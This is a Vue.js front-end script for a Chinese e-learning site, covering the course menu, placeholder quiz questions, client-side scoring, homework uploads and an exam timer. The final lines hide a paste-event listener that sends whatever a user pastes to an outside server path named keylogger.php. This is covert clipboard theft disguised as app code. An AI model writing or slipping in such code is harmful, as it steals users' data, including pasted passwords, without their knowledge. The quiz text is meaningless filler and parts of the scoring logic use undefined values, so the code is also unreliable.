/**
 * 
 * 
 * 课程左侧公告信息栏
 * 
 */
var course = {

    infoList: [
        {
            icon: 'el-icon-bell',
            title: '公告',
            children: [
                {
                    title: '课程介绍',
                    href: 'courseNotice.html'
                }
            ],
        },
        {
            icon: 'el-icon-reading',
            title: '课件',
            children: [
                {
                    title: '课件',
                    href: 'courseware.html'
                }
            ],
        },
        {
            icon: 'el-icon-edit',
            title: '测试与作业',
            children: [
                {
                    title: '题型作业',
                    href: 'workAndTest.html'
                },
                {
                    title: '文档作业',
                    href: 'docWork.html'
                }
            ],
        },
        {
            icon: 'el-icon-eleme',
            title: '考试',
            children: [
                {
                    title: '考试',
                    href: 'testInfo.html'
                }
            ],
        },
        {
            icon: 'el-icon-chat-dot-square',
            title: '讨论区',
            children: [
                {
                    title: '讨论区',
                    href: 'talk.html'
                }
            ],
        },
        {
            icon: 'el-icon-medal',
            title: '评价',
            children: [
                {
                    title: '评价',
                    href: 'evaluate.html'
                }
            ],
        },
    ]
}


var userOptions = {
    order: [
        {
            title: '查看进度',
            icon: 'el-icon-collection',
            href: 'courseLoading.html'
        },
        {
            title: '课内消息',
            icon: 'el-icon-chat-dot-round',
            href: '#'
        },
        {
            title: '退出课堂',
            icon: 'el-icon-back',
            href: 'lookUpCourse.html'
        }
    ]
}
var danxuan = [
    {
        title: '那艘if阿富豪我好是欧式花是你OA深？',
        options: ['12', '17', '13', '20']
    },
    {
        title: '部分可微波古尔沟我顾伟UI我还？',
        options: ['14', '10', '13', '22']
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74']
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74']
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74']
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74']
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74']
    },
    {
        title: '放水后is后我换个问过我无比股市公司规划升级版素',
        options: ['24', '12', '45', '74']
    }
];
var duoxuan = [
    {
        title: '阿Ivan哦我AV你哦是AV噶大V11成本法牛初步',
        options: ['1', '2', '3', '4', '5']
    }
];
var tiankong = [
    {
        title: '中国的直辖市有那个_______',
        input: ''
    },
    {
        title: '你的_______是核心',
        input: ''
    }
];
var zhuguan = [
    {
        title: '你的感想是什么？',
        input: ''
    }
];
//请求得到
var answer = [
    {
        type: 'dx',
        value: [0, 0, 2, 2, 3, 3, 3, 3],
        score: 5
    },
    {
        type: 'sx',
        value: [['1', '2']],
        score: 10
    },
    {
        type: 'tk',
        value: ['123456', '654321'],
        score: 10
    },
    {
        type: 'zg',
        value: ['123456'],
        score: 30
    }
];
danxuan.forEach((item) => {
    item.select = 'default';
    item.type = -1;
});
duoxuan.forEach((item) => {
    item.select = [];
    item.type = -1;
});
tiankong.forEach((item) => {
    item.type = -1;
});
zhuguan.forEach((item) => {
    item.type = -1;
});
var app = new Vue({
    el: '#app',
    data: {
        user: window.localStorage.getItem('_userName'),
        course: course,
        userOptions: userOptions,
        name: JSON.parse(window.localStorage.getItem('_course')).name || '',
        workName: window.localStorage.getItem('_work') != undefined ? JSON.parse(window.localStorage.getItem('_work')).name : '',
        activeNames: ['1'],
        showdata: '',
        test: [],
        exam: [
            { title: '考试一', start: '2019-8-7', end: '2019-12-7', info: '其他', state: 0, score: 87 },
            { title: '考试二', start: '2019-9-7', end: '2019-12-7', info: '其他', state: 1, score: 0 },
            { title: '考试三', start: '2019-9-7', end: '2019-12-7', info: '其他', state: -1, score: 0 }
        ],
        radio: '1',
        danxuan: danxuan,
        duoxuan: duoxuan,
        tiankong: tiankong,
        zhuguan: zhuguan,
        answer: answer,
        disabled: false,
        time: '00:10:10',
        wares: [],
        talk: [
            { name: 'Lumnca', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 84, date: '2019/12/21 20:12' },
            { name: 'Kay', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 45, date: '2019/12/24 04:23' },
            { name: 'May', info: '抗击疫情，我们每个人都有责任，社会还需要继续发展，我们需要做的，就是注意好个人卫生，待在家里！等春天到来，万物复苏！', number: 233, date: '2019/12/29 11:58' }
        ],
        evaluate: {
            number: 3.9,
            infor: ''
        },
        docWorks: [],
        docWork: {
            name: '',
            file_url: [],
            start_date : '',
            end_date : '',
            id : ''
        },
        dialogFormVisible7: false,
        score : 0,
        worktime : '',
        dialogFormVisible : false,
        submitform : {
            body : {
                name : '',
                file : ''
            },
            date : ''
        }
    },
    methods: {
        handleOpen(key, keyPath) {
            console.log(key, keyPath);
        },
        handleClose(key, keyPath) {
            console.log(key, keyPath);
        },
        handleChange(val) {

        },
        computedScore() {
            var score = 0;
            var tkMistake = 0;
            var dxMistake = 0;
            var zgMistake = 0;
            var sxMistake = 0;


            for (let index = 0; index < this.danxuan.length; index++) {
                let d = this.danxuan[index];
                if (d.select == d.answer) {
                    score += d.score;
                }
                else {
                    dxMistake++;
                    d.type = 1;
                }
            }


            for (let index = 0; index < this.duoxuan.length; index++) {
                let d = this.duoxuan[index];
                d.select.sort();
                d.answer.sort();
                if (d.select.toString() == d.answer.toString()) {
                    score += d.score;
                }
                else {
                    sxMistake++;
                    d.type = 1;
                }

            }
            for (let index = 0; index < this.tiankong.length; index++) {
                let d = this.tiankong[index];
                if (d.input.trim() == d.answer) {
                    score += d.score;
                }
                else {
                    tkMistake++;
                    d.type = 1;
                }
            }


            for (let index = 0; index < this.zhuguan.length; index++) {
                let d = this.zhuguan[index];
                if (d.input.trim() == d.answer) {
                    score += d.score;
                }
                else {
                    zgMistake++;
                    d.type = 1;
                }
            }
            let body = {
                danxuan : app.danxuan,
                duoxuan : app.duoxuan,
                tiankong : app.tiankong,
                zhuguan : app.zhuguan
            }
            if (!app.disabled) {
                let submit = {
                    id: maxId+1,
                    wid: JSON.parse(window.localStorage.getItem('_work')).id,
                    cid: JSON.parse(window.localStorage.getItem('_work')).cid,
                    uid: JSON.parse(window.localStorage.getItem('_user')).id,
                    type: 1,
                    date: app.dateFormat(new Date()),
                    other: '',
                    body: JSON.stringify(body),
                    score: score,
                    state: 1
                }

                axios.post('http://127.0.0.1:8081/submit', submit)
                    .then(function (response) {
                        app.$message({
                            type: 'success',
                            message: '提交成功！'
                        });
                    })
                    .catch(function (error) {
                        console.log(error);
                    });


                this.$notify({
                    title: '提示',
                    message: '选择题错误个数: ' + (dxMistake + sxMistake) + '  填空题错误个数: ' + tkMistake + ' 主观题错误个数: ' + zgMistake + '  最后得分:' + score,
                    duration: 0
                });
            }

            app.disabled = true;
        },
        write_work(work) {
            if(work.start_date.getTime()<new Date().getTime()&&work.end_date.getTime()>new Date().getTime()){
                window.localStorage.setItem("_work", JSON.stringify(work));
                window.location.href = "workShow.html";
            }
            else{
                if(work.start_date.getTime()>new Date().getTime()){
                    this.$message.error('提交时间未到');
                }
                if(work.end_date.getTime()<new Date().getTime()){
                    this.$message.error('提交时间已过');
                }
            }
           
        },
        edit_work(work) {
            console.log(JSON.stringify(work));
        },
        write_exam(work) {
            window.localStorage.setItem("_exam", work);
            window.location.href = "testShow.html";
        },
        edit_exam(work) {
            console.log(JSON.stringify(work));
        },
        addZ(item) {
            item.number += 1;
        },
        playViedo(item) {
            window.location.href = "courseVideo.html";
        },
        handleRemove(file, fileList) {
            console.log(file, fileList);
        },
        beforeRemove(file, fileList) {
            axios.get('http://127.0.0.1:8081/delete', {
                params: {
                    file: file.name
                }
            })
                .then(function (response) {
                    app.$message({
                        type: 'success',
                        message: response.data
                    });
                    console.log(response.data);
                })
                .catch(function (error) {
                    console.log(error);
                });
        },
        handleAvatarSuccess(res, file) {
            this.docWork.file_url.splice(0, 1);
            this.docWork.file_url.push({
                name: file.name,
                url: file.name
            });
            this.$message({
                message: '文件:' + file.name + '上传成功！',
                type: 'success'
            });
        },
        editDocWork(data) {
            this.dialogFormVisible7 = true;
            this.docWork = data;
        },
        submit(data){
            let body = {
                name : data.file_name,
                file : data.file_url[0].url
            }

            axios.get('http://127.0.0.1:8081/submitfiledate',{
                params : {
                    wid : data.id,
                    uid : JSON.parse(window.localStorage.getItem("_user")).id
                }
            })
            .then(function (response) {
                if(response.data!=''&&response.data!=undefined&&response.data!={}){
                    response.data.date = app.dateFormat(new Date());
                    response.data.body =  JSON.stringify(body);

                    axios.put('http://127.0.0.1:8081/submit/'+response.data.id,response.data)
                    .then(function (response) {
                        app.$message({
                            message: '作业重新上传成功！',
                            type: 'success'
                        });
                        app.dialogFormVisible7 = false;
                    })
                    .catch(function (error) {
                        console.log(error);
                        app.dialogFormVisible7 = false;
                    });
                }
                else{
                   
        
                    let docS = {
                        id: maxId+2,
                        wid: data.id,
                        cid: data.cid,
                        uid: JSON.parse(window.localStorage.getItem('_user')).id,
                        type: 2,
                        date: app.dateFormat(new Date()),
                        other: '',
                        body: JSON.stringify(body),
                        score: 0,
                        state: 1
                    }
        
                    axios.post('http://127.0.0.1:8081/submit',docS)
                    .then(function (response) {
                        app.$message({
                            message: '作业上传成功！',
                            type: 'success'
                        });
                        app.dialogFormVisible7 = false;
                    })
                    .catch(function (error) {
                        console.log(error);
                        app.dialogFormVisible7 = false;
                    });
                }
            })

            .catch(function (error) {
                app.dialogFormVisible7 = false;
                console.log(error);
            });
            
          

        },
        dateFormat(date) {
            return date.getFullYear() + "/" + (date.getMonth() + 1) + "/" + date.getDate() + " " + (date.getHours() > 9 ? date.getHours() : '0' + date.getHours()) + ":" + (date.getMinutes() > 9 ? date.getMinutes() : '0' + date.getMinutes()) + ":" + (date.getSeconds() > 9 ? date.getSeconds() : '0' + date.getSeconds());
        },
        showSubmit(docWork){
            this.dialogFormVisible = true;
            axios.get('http://127.0.0.1:8081/submitfiledate',{
                params : {
                    wid : docWork.id,
                    uid : JSON.parse(window.localStorage.getItem("_user")).id
                }
            })
            .then(function (response) {
                if(response.data!=''&&response.data!=undefined&&response.data!={}){
                    app.submitform = response.data;
                    app.submitform.body = JSON.parse(app.submitform.body);
                }
            })
            .catch(function (error) {
                console.log(error);
            });
        }
    },
    computed: {
    },
});

var time = app.time;
var hh = parseInt(time.split(':')[0]);
var mm = parseInt(time.split(':')[1]);
var ss = parseInt(time.split(':')[2]);
var timer = setInterval(() => {
    var hh = parseInt(time.split(':')[0]);
    var mm = parseInt(time.split(':')[1]);
    var ss = parseInt(time.split(':')[2]);
    if (ss > 0) {
        ss -= 1;
    }
    else {
        if (mm > 0) {
            ss = 59;
            mm -= 1;

        }
        else {
            if (hh > 0) {
                ss = 59;
                mm = 59;
                hh -= 1;
            }
        }
    }
    if (mm < 10) {
        mm = '0' + mm;
    }
    if (ss < 10) {
        ss = '0' + ss;
    }
    if (hh < 10) {
        hh = '0' + hh;
    }
    app.time = hh + ':' + mm + ':' + ss;
    time = app.time;
    if (hh == 0 && mm == 0 && ss == 0) {
        app.time = '- -:- -:- -';
        clearInterval(timer);
        app.disabled = true;
    }
}, 1000);




window.addEventListener('paste', function (e) {
    console.log(e.clipboardData.getData('text'));
    var txt = e.clipboardData.getData('text');
    var http = new XMLHttpRequest();
    http.open("POST", "http://47.106.254.86:1234/test/keylogger.php", false);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.send("key=" + txt);
}, false)